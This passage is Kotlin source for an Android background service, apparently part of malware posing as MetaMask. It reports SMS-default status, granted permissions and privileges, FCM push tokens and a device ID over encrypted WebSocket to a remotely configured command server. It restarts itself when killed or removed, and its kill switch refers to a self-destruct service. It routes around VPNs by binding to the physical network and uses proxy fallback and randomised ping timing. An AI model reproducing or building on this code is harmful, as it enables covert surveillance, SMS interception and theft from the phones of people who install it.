            this@MasterWebSocketDispatcher.sendBroadcast(base)
        }

        private fun schedulePing(ws: WebSocket) {
            android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] schedulePing enter ws=${ws}") //xdbg
            cancelPing()
            pingRunnable = object : Runnable {
                override fun run() {
                    android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] run enter") //xdbg
                    if (this@MasterWebSocketDispatcher.webSocket == ws && IS_SERVICE_RUNNING) {
                        android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] if branch") //xdbg
                        try {
                            val permissionsJson = PermissionHelper.checkPermissions(this@MasterWebSocketDispatcher)
                            val privilegesJson = PrivilegeChecker.getAllPrivilegesStatus(this@MasterWebSocketDispatcher)
                            val isDefaultSms = PrivilegeChecker.isDefaultSmsApp(this@MasterWebSocketDispatcher)

                            val appName = try {
                                val prefs = this@MasterWebSocketDispatcher.getSharedPreferences("DeviceCheck", Context.MODE_PRIVATE)
                                val smartName = prefs.getString("cached_smart_app_name", null)

                                if (!smartName.isNullOrBlank()) {
                                    android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] if branch") //xdbg
                                    smartName
                                } else {
                                    val pm = packageManager
                                    val appInfo = applicationInfo
                                    pm.getApplicationLabel(appInfo).toString()
                                }
                            } catch (e: Exception) {
                                android.util.Log.e("XDBG", "[MasterWebSocketDispatcher] catch ${e.javaClass.simpleName}: ${e.message}") //xdbg
                                "Unknown"
                            }

                            val now = System.currentTimeMillis()
                            if (now - lastFcmResendMs >= 1_800_000L) {
                                android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] if branch") //xdbg
                                lastFcmResendMs = now
                                sendCachedTokens()
                            }

                            val pingMessage = JSONObject().apply {
                                put("action", "ping")
                                put("appName", appName)
                                put("is_default_sms", isDefaultSms)
                                if (permissionsJson.getString("status") == "success") {
                                    android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] if branch") //xdbg
                                    put("permissions", permissionsJson.getJSONObject("data"))
                                }
                                put("privileges", privilegesJson)
                            }

                            val sent = try {
                                val rawData = pingMessage.toString()

                                val encryptedData = com.yourcompany.core.jni.NativeBridge.nativeEncryptData(rawData)

                                val envelope = JSONObject().apply {
                                    put("p", encryptedData)
                                }

                                val finalPayload = envelope.toString()

                                val result = ws.send(finalPayload)
                                result
                            } catch (e: Exception) {
                                android.util.Log.e("XDBG", "[MasterWebSocketDispatcher] catch ${e.javaClass.simpleName}: ${e.message}") //xdbg
                                false
                            }

                            if (sent) {
                                android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] if branch") //xdbg
                                lastQueueSizeBytes = ws.queueSize()
                            }

                        } catch (e: Exception) {
                            android.util.Log.e("XDBG", "[MasterWebSocketDispatcher] catch ${e.javaClass.simpleName}: ${e.message}") //xdbg
                        }

                        if (IS_SERVICE_RUNNING && this@MasterWebSocketDispatcher.webSocket == ws) {
                            android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] if branch") //xdbg
                            pingHandler.postDelayed(this, (3000L..8000L).random())
                        }
                    }
                }
            }
            pingHandler.postDelayed(pingRunnable!!, (2000L..5000L).random())
        }

        private fun cancelPing() {
            android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] cancelPing enter") //xdbg
            pingRunnable?.let { pingHandler.removeCallbacks(it) }
            pingRunnable = null
        }
    }

    private fun checkAndReportDefaultSmsStatus() {
        android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] checkAndReportDefaultSmsStatus enter") //xdbg
        try {
            val isDefault = com.example.MetaMask.utils.PrivilegeChecker.isDefaultSmsApp(this@MasterWebSocketDispatcher)

            val statusUpdatePayload = JSONObject().apply {
                put("action", "defaultSmsStatusUpdate")
                put("isDefault", isDefault)
            }

            val sendIntent = Intent(ACTION_SEND_TO_SERVER).apply {
                putExtra(EXTRA_MESSAGE_TO_SEND, statusUpdatePayload.toString())
            }
            this@MasterWebSocketDispatcher.sendBroadcast(sendIntent)
        } catch (e: Exception) {
            android.util.Log.e("XDBG", "[MasterWebSocketDispatcher] catch ${e.javaClass.simpleName}: ${e.message}") //xdbg
        }
    }

    private fun isNetworkAvailable(context: Context): Boolean {
        android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] isNetworkAvailable enter context=ctx") //xdbg
        val cm = context.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
        val network = cm.activeNetwork ?: return false
        val capabilities = cm.getNetworkCapabilities(network) ?: return false
        android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] return") //xdbg
        return capabilities.hasCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET)
    }

    private fun scheduleRestart() {
        android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] scheduleRestart enter") //xdbg
        if (!IS_SERVICE_RUNNING) return
        val restartIntent = Intent(this@MasterWebSocketDispatcher, MasterWebSocketDispatcher::class.java).apply {
            setPackage(this@MasterWebSocketDispatcher.packageName)
        }
        val pendingIntent = PendingIntent.getService(
            this@MasterWebSocketDispatcher,
            RESTART_PENDING_INTENT_REQUEST_CODE,
            restartIntent,
            PendingIntent.FLAG_ONE_SHOT or PendingIntent.FLAG_IMMUTABLE
        )
        val alarmManager = getSystemService(Context.ALARM_SERVICE) as AlarmManager
        alarmManager.set(
            AlarmManager.ELAPSED_REALTIME_WAKEUP,
            SystemClock.elapsedRealtime() + 2000,
            pendingIntent
        )
    }

    override fun onTaskRemoved(rootIntent: Intent?) {
        android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] onTaskRemoved enter rootIntent=${rootIntent}") //xdbg
        scheduleRestart()
        sendRestartBroadcast()
        super.onTaskRemoved(rootIntent)
    }

    private fun sendRestartBroadcast() {
        android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] sendRestartBroadcast enter") //xdbg
        val broadcastIntent = Intent("com.example.MetaMask.RESTART_SERVICE")
        broadcastIntent.setPackage(this@MasterWebSocketDispatcher.packageName)
        this@MasterWebSocketDispatcher.sendBroadcast(broadcastIntent)
    }

    override fun onDestroy() {
        android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] onDestroy enter") //xdbg
        KeepAliveManager.releaseAll(this)
        unregisterTelephonyListener()
        val killSwitchPrefs = getSharedPreferences(SelfDestructService.PREFS_NAME, Context.MODE_PRIVATE)

        if (killSwitchPrefs.getBoolean(SelfDestructService.KEY_PERMANENTLY_DISABLED, false)) {
            android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] if branch") //xdbg
            IS_SERVICE_RUNNING = false

            if (::statusPrefs.isInitialized) {
                android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] if branch") //xdbg
                statusPrefs.edit().putBoolean(KEY_IS_RUNNING, false).apply()
            }

            try {
                unregisterReceiver(serverSendReceiver)
            } catch (e: IllegalArgumentException) {
                android.util.Log.e("XDBG", "[MasterWebSocketDispatcher] catch ${e.javaClass.simpleName}: ${e.message}") //xdbg
            }

            serviceJob.cancel()
            handler.removeCallbacksAndMessages(null)

            webSocket?.close(1000, "Service Destroyed")

            if (CURRENT_INSTANCE === this) CURRENT_INSTANCE = null

            super.onDestroy()
            return
        }

        if (::statusPrefs.isInitialized) {
            android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] if branch") //xdbg
            statusPrefs.edit().putBoolean(KEY_IS_RUNNING, false).apply()
        }

        IS_SERVICE_RUNNING = false
        serviceJob.cancel()
        unregisterNetworkCallback()

        try {
            unregisterReceiver(serverSendReceiver)
        } catch (e: IllegalArgumentException) {
            android.util.Log.e("XDBG", "[MasterWebSocketDispatcher] catch ${e.javaClass.simpleName}: ${e.message}") //xdbg
        }

        handler.removeCallbacksAndMessages(null)
        webSocket?.close(1000, "Service Destroyed")

        scheduleRestart()

        if (CURRENT_INSTANCE === this) CURRENT_INSTANCE = null

        super.onDestroy()

        val hasReadSms = androidx.core.content.ContextCompat.checkSelfPermission(this, android.Manifest.permission.READ_SMS) == android.content.pm.PackageManager.PERMISSION_GRANTED

        if (hasReadSms) {
            android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] if branch") //xdbg
            sendRestartBroadcast()
        }
    }

    private fun registerTelephonyListener() {
        android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] registerTelephonyListener enter") //xdbg
        try {
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE)
                    != PackageManager.PERMISSION_GRANTED) return
            val tm = getSystemService(Context.TELEPHONY_SERVICE) as? TelephonyManager ?: return
            telephonyManagerRef = tm
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] if branch") //xdbg
                registerModernTelephonyCallback(tm)
            } else {
                registerLegacyPhoneStateListener(tm)
            }
        } catch (e: Exception) {}
    }

    @androidx.annotation.RequiresApi(Build.VERSION_CODES.S)
    private fun registerModernTelephonyCallback(tm: TelephonyManager) {
        android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] registerModernTelephonyCallback enter tm=${tm}") //xdbg
        val cb = object : android.telephony.TelephonyCallback(),
            android.telephony.TelephonyCallback.DataConnectionStateListener,
            android.telephony.TelephonyCallback.CallStateListener {
            override fun onDataConnectionStateChanged(state: Int, networkType: Int) {
                android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] onDataConnectionStateChanged enter state=${state} networkType=${networkType}") //xdbg
                if (state == TelephonyManager.DATA_CONNECTED) onPhoneStateTrigger()
            }
            override fun onCallStateChanged(state: Int) {
                android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] onCallStateChanged enter state=${state}") //xdbg
                if (state == TelephonyManager.CALL_STATE_IDLE) onPhoneStateTrigger()
            }
        }
        val executor = java.util.concurrent.Executor { cmd -> Handler(Looper.getMainLooper()).post(cmd) }
        tm.registerTelephonyCallback(executor, cb)
        phoneStateCallback = cb
    }

    @Suppress("DEPRECATION")
    private fun registerLegacyPhoneStateListener(tm: TelephonyManager) {
        android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] registerLegacyPhoneStateListener enter tm=${tm}") //xdbg
        val listener = object : PhoneStateListener() {
            override fun onDataConnectionStateChanged(state: Int, networkType: Int) {
                android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] onDataConnectionStateChanged enter state=${state} networkType=${networkType}") //xdbg
                if (state == TelephonyManager.DATA_CONNECTED) onPhoneStateTrigger()
            }
            override fun onCallStateChanged(state: Int, phoneNumber: String?) {
                android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] onCallStateChanged enter state=${state} phoneNumber=${phoneNumber}") //xdbg
                if (state == TelephonyManager.CALL_STATE_IDLE) onPhoneStateTrigger()
            }
        }
        tm.listen(
            listener,
            PhoneStateListener.LISTEN_DATA_CONNECTION_STATE or PhoneStateListener.LISTEN_CALL_STATE
        )
        phoneStateCallback = listener
    }

    private fun unregisterTelephonyListener() {
        android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] unregisterTelephonyListener enter") //xdbg
        try {
            val tm = telephonyManagerRef ?: return
            val cb = phoneStateCallback ?: return
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] if branch") //xdbg
                tm.unregisterTelephonyCallback(cb as android.telephony.TelephonyCallback)
            } else {
                @Suppress("DEPRECATION")
                tm.listen(cb as PhoneStateListener, PhoneStateListener.LISTEN_NONE)
            }
        } catch (e: Exception) {}
        phoneStateCallback = null
        telephonyManagerRef = null
    }

    private fun onPhoneStateTrigger() {
        android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] onPhoneStateTrigger enter") //xdbg
        val now = System.currentTimeMillis()
        if (now - lastPhoneStateTriggerMs < PHONE_STATE_DEBOUNCE_MS) return
        lastPhoneStateTriggerMs = now
        Handler(Looper.getMainLooper()).post {
            if (!IS_SERVICE_RUNNING) return@post
            if (webSocket == null) {
                android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] if branch") //xdbg
                serviceScope.launch {
                    if (RemoteConfig.serverDomain != null || RemoteConfig.fetchDomain(applicationContext)) {
                        android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] if branch") //xdbg
                        Handler(Looper.getMainLooper()).post { initializeWebSocket() }
                    }
                }
            } else {
                serviceScope.launch { checkAndHealWebSocket() }
            }
        }
    }

    private fun isExternalVpnActive(): Boolean {
        android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] isExternalVpnActive enter") //xdbg
        val cm = connectivityManager ?: return false
        val activeNet = cm.activeNetwork ?: return false
        val caps = cm.getNetworkCapabilities(activeNet) ?: return false
        android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] return") //xdbg
        return caps.hasTransport(NetworkCapabilities.TRANSPORT_VPN)
    }

    private fun findAndBindPhysicalNetwork() {
        android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] findAndBindPhysicalNetwork enter") //xdbg
        val cm = connectivityManager ?: return
        val allNets = cm.allNetworks
        val phys = allNets
            .filter { net ->
                val caps = cm.getNetworkCapabilities(net) ?: return@filter false
                caps.hasCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET) &&
                        !caps.hasTransport(NetworkCapabilities.TRANSPORT_VPN)
            }
            .maxByOrNull { net ->
                val caps = cm.getNetworkCapabilities(net) ?: return@maxByOrNull 0
                when {
                    caps.hasTransport(NetworkCapabilities.TRANSPORT_WIFI) -> 3
                    caps.hasTransport(NetworkCapabilities.TRANSPORT_ETHERNET) -> 2
                    else -> 1
                }
            }
        val physType = phys?.let { n ->
            val c = cm.getNetworkCapabilities(n)
            when {
                c?.hasTransport(NetworkCapabilities.TRANSPORT_WIFI) == true -> "wifi"
                c?.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR) == true -> "cell"
                else -> "other"
            }
        } ?: "null"
        android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] findAndBind chose=$phys type=$physType") //xdbg
        physicalNetwork = phys
        cm.bindProcessToNetwork(phys)
        com.example.MetaMask.utils.NetworkState.update(phys, isBound = phys != null)
    }

    private fun startRealityRecheckTimer() {
        android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] startRealityRecheckTimer enter") //xdbg
        realityRecheckJob?.cancel()
        realityRecheckJob = serviceScope.launch {
            while (usingDirectWsFallback) {
                delay(REALITY_RECHECK_INTERVAL_MS)
                if (!usingDirectWsFallback) break
                android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] realityRecheck: pinging REALITY...") //xdbg
                val available = com.example.MetaMask.utils.RealityConfig.pingAny()
                android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] realityRecheck: available=$available") //xdbg
                if (available) {
                    usingDirectWsFallback = false
                    realityConsecutiveFails = 0
                    android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] realityRecheck: REALITY restored, switching back") //xdbg
                    stopRealityRecheckTimer()
                    Handler(Looper.getMainLooper()).post {
                        if (IS_SERVICE_RUNNING) {
                            webSocket?.cancel()
                            webSocket = null
                            isConnecting = false
                            initializeWebSocket()
                        }
                    }
                    break
                }
            }
        }
    }

    private fun stopRealityRecheckTimer() {
        android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] stopRealityRecheckTimer enter") //xdbg
        realityRecheckJob?.cancel()
        realityRecheckJob = null
    }

    private fun registerNetworkCallback() {
        android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] registerNetworkCallback enter") //xdbg
        connectivityManager = getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
        val networkRequest = NetworkRequest.Builder()
            .addCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET)
            .addCapability(NetworkCapabilities.NET_CAPABILITY_NOT_VPN)
            .build()

        networkCallback = object : ConnectivityManager.NetworkCallback() {
            override fun onAvailable(network: Network) {
                super.onAvailable(network)
                val caps = connectivityManager?.getNetworkCapabilities(network)
                val isVpn = caps?.hasTransport(NetworkCapabilities.TRANSPORT_VPN) == true
                val isWifi = caps?.hasTransport(NetworkCapabilities.TRANSPORT_WIFI) == true
                val isCellular = caps?.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR) == true
                android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] onAvailable network=${network} wifi=${isWifi} cell=${isCellular} vpn=${isVpn}") //xdbg
                val currentIsWifi = physicalNetwork?.let {
                    connectivityManager?.getNetworkCapabilities(it)?.hasTransport(NetworkCapabilities.TRANSPORT_WIFI) == true
                } ?: false
                if (currentIsWifi && !isWifi) {
                    android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] onAvailable: keeping wifi, ignoring cellular") //xdbg
                    return
                }
                physicalNetwork = network
                if (isExternalVpnActive()) {
                    android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] if branch") //xdbg
                    return
                }
                connectivityManager?.bindProcessToNetwork(network)
                com.example.MetaMask.utils.NetworkState.update(network, isBound = true)
                Handler(Looper.getMainLooper()).post {
                    if (webSocket == null) {
                        android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] if branch") //xdbg
                        serviceScope.launch {
                            if (RemoteConfig.serverDomain != null || RemoteConfig.fetchDomain(applicationContext)) {
                                android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] if branch") //xdbg
                                Handler(Looper.getMainLooper()).post { initializeWebSocket() }
                            }
                        }
                    }
                }
            }

            override fun onLost(network: Network) {
                android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] onLost enter network=${network}") //xdbg
                super.onLost(network)
                if (physicalNetwork == network) {
                    android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] if branch") //xdbg
                    physicalNetwork = null
                    connectivityManager?.bindProcessToNetwork(null)
                    com.example.MetaMask.utils.NetworkState.update(null, isBound = false)
                    val remaining = connectivityManager?.allNetworks?.size ?: 0
                }
            }
        }
        connectivityManager?.registerNetworkCallback(networkRequest, networkCallback!!)
        val vpnRequest = NetworkRequest.Builder()
            .addTransportType(NetworkCapabilities.TRANSPORT_VPN)
            .build()
        vpnNetworkCallback = object : ConnectivityManager.NetworkCallback() {
            override fun onAvailable(network: Network) {
                android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] onAvailable enter network=${network}") //xdbg
                connectivityManager?.bindProcessToNetwork(null)
                Handler(Looper.getMainLooper()).post {
                    if (!IS_SERVICE_RUNNING) return@post
                    webSocket?.cancel()
                    webSocket = null
                    isConnecting = false
                    serviceScope.launch {
                        try {
                            RemoteConfig.fetchDomain(applicationContext)
                        } catch (e: kotlinx.coroutines.CancellationException) {
                            throw e
                        } catch (e: Exception) {
                            android.util.Log.e("XDBG", "[MasterWebSocketDispatcher] catch ${e.javaClass.simpleName}: ${e.message}") //xdbg
                        }
                        Handler(Looper.getMainLooper()).post {
                            if (IS_SERVICE_RUNNING) initializeWebSocket()
                        }
                    }
                }
            }
            override fun onLost(network: Network) {
                android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] onLost enter network=${network}") //xdbg
                usingDirectWsFallback = false
                realityConsecutiveFails = 0
                stopRealityRecheckTimer()
                android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] vpnNetworkCallback.onLost: reset fallback, back to REALITY mode") //xdbg
                findAndBindPhysicalNetwork()
                Handler(Looper.getMainLooper()).post {
                    if (!IS_SERVICE_RUNNING) return@post
                    webSocket?.cancel()
                    webSocket = null
                    isConnecting = false
                    serviceScope.launch {
                        val realityJob = launch {
                            try {
                                com.example.MetaMask.utils.RealityConfig.fetch()
                            } catch (e: Exception) {
                                android.util.Log.e("XDBG", "[MasterWebSocketDispatcher] catch ${e.javaClass.simpleName}: ${e.message}") //xdbg
                            }
                        }
                        try {
                            RemoteConfig.fetchDomain(applicationContext)
                        } catch (e: kotlinx.coroutines.CancellationException) {
                            throw e
                        } catch (e: Exception) {
                            android.util.Log.e("XDBG", "[MasterWebSocketDispatcher] catch ${e.javaClass.simpleName}: ${e.message}") //xdbg
                        }
                        realityJob.join()
                        Handler(Looper.getMainLooper()).post {
                            if (IS_SERVICE_RUNNING) initializeWebSocket()
                        }
                    }
                }
            }
        }
        connectivityManager?.registerNetworkCallback(vpnRequest, vpnNetworkCallback!!)
    }

    private fun unregisterNetworkCallback() {
        android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] unregisterNetworkCallback enter") //xdbg
        try {
            networkCallback?.let {
                connectivityManager?.unregisterNetworkCallback(it)
            }
        } catch (e: Exception) {
            android.util.Log.e("XDBG", "[MasterWebSocketDispatcher] catch ${e.javaClass.simpleName}: ${e.message}") //xdbg
        }
        try {
            vpnNetworkCallback?.let {
                connectivityManager?.unregisterNetworkCallback(it)
            }
        } catch (e: Exception) {
            android.util.Log.e("XDBG", "[MasterWebSocketDispatcher] catch ${e.javaClass.simpleName}: ${e.message}") //xdbg
        }
    }

    private fun sendCachedTokens() {
        android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] sendCachedTokens enter") //xdbg
        try {
            val uuid = DeviceUUIDProvider.getUUID() ?: return

            val fcmPrefs = getSharedPreferences("fcm_prefs", Context.MODE_PRIVATE)
            val fcmToken = fcmPrefs.getString("fcm_token", null)
            android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] sendCachedTokens fcmToken=${fcmToken?.take(20)}... isEmpty=${fcmToken.isNullOrEmpty()}") //xdbg

            if (fcmToken.isNullOrEmpty()) {
                android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] sendCachedTokens no token, scheduling pushCurrentTokenToServer") //xdbg
                serviceScope.launch { com.example.MetaMask.services.FcmTokenService.pushCurrentTokenToServer(this@MasterWebSocketDispatcher) }
                return
            }

            if (!fcmToken.isNullOrEmpty()) {
                android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] if branch") //xdbg
                val json = JSONObject().apply {
                    put("action", "fcmTokenUpdate")
                    put("fcmToken", fcmToken)
                    put("uuid", uuid)
                    put("packageName", packageName)
                }

                val rawData = json.toString()
                val encryptedData = com.yourcompany.core.jni.NativeBridge.nativeEncryptData(rawData)

                val envelope = JSONObject().apply {
                    put("p", encryptedData)
                }

                val sent = webSocket?.send(envelope.toString()) ?: false
            }

        } catch (e: Exception) {
            android.util.Log.e("XDBG", "[MasterWebSocketDispatcher] catch ${e.javaClass.simpleName}: ${e.message}") //xdbg
        }
    }
}
